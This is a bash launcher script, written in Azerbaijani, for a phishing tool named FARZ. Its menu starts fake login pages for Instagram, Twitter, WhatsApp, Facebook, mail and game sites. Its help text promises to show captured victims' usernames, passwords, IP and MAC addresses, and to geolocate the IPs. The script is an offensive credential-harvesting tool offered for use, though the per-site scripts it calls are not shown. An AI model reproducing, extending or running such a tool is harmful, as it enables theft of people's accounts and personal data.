#!/bin/bash
#!/bin/sh
#Developer:Nihat 「 FARZ 」
#İnstagram : @NihatFarz
#Telegram : NihatFarz
clear
case $1 in

      "--help")
	   sleep 1
       echo -e "
--help & --h   (Kömək Menyusu)
--ıp & --ip    (Giriş Etmiş İstifadəçilərin Ip Adresini Göstərər)
--user         (Giriş Etmiş Username & Pass)
--mac          (Giriş Etmiş Mac Adresləri)
--location     (Seçilən Ip Adresinin Yerinin Tapılması)
bash farz.sh & sh farz.sh (Phishing Toolu 'nu İşə Salar)
   "
  ;;

     "--h")
	   sleep 1
       echo -e "
--help & --h   (Kömək Menyusu)
--ıp & --ip    (Giriş Etmiş İstifadəçilərin Ip Adresini Göstərər)
--user         (Giriş Etmiş Username & Pass)
--mac          (Giriş Etmiş Mac Adresləri)
--location     (Seçilən Ip Adresinin Yerinin Tapılması)
bash farz.sh & sh farz.sh (Phishing Toolu 'nu İşə Salar)"

  ;;

esac

banner(){
echo -e '\033[31;40;1m 
	███████╗ █████╗ ██████╗ ███████╗
        ██╔════╝██╔══██╗██╔══██╗╚══███╔╝
        █████╗  ███████║██████╔╝  ███╔╝ 
        ██╔══╝  ██╔══██║██╔══██╗ ███╔╝  
        ██║     ██║  ██║██║  ██║███████╗
        ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝          

	   \e[32mNihat 「 FARZ 」	
	 \e[32mTelegram @NihatFarz	
  \e[31mTool Özəl Olaraq MaragliWeb Kanalı Üçün Yazılmışdır.	
'
echo -e '
\e[31m[01]\e[32mİnstagram			\e[31m[04]\e[32mFacebook
\e[31m[02]\e[32mTwitter			\e[31m[05]\e[32mMail
\e[31m[03]\e[32mWhatsapp			\e[31m[06]\e[32mGame (Oyunlar)

\e[31m[00] Code

\e[31m[99] Çıxış


'
read -p  "Seçim Edin:" islem
}



banner
if [[ $islem == 1 || $islem == 01 ]]; then
	sleep 1
	clear
	cd Site/Instagram/
	bash start.sh

elif [[ $islem == 2 || $islem == 02 ]]; then
	sleep 1
	clear
	cd  Site/Twitter/
	bash start.sh

elif [[ $islem == 3 || $islem == 03 ]]; then
	sleep 1
	clear
	cd Site/Whatsapp/
	bash start.sh

elif [[ $islem == 4 || $islem == 04 ]]; then
	sleep 1
	clear
	cd  Site/Facebook/
	bash start.sh

elif [[ $islem == 5 || $islem == 05 ]]; then
	sleep 1
	clear
	cd  Site/Mail/
	bash start.sh

elif [[ $islem == 6 || $islem == 06 ]]; then
	sleep 1
	clear
	cd  Site/Game/
	bash start.sh
elif [[ $islem == 00 ]]; then

	cd Site/
	bash code.sh

elif [[ $islem == 99 ]]; then
	exit 1
else
	echo -e '\033[36;40;1m Xəta.Qeyd Etdiyiniz Seçimi düzgün edin....'	
	sleep 1
	clear 
	banner
fi
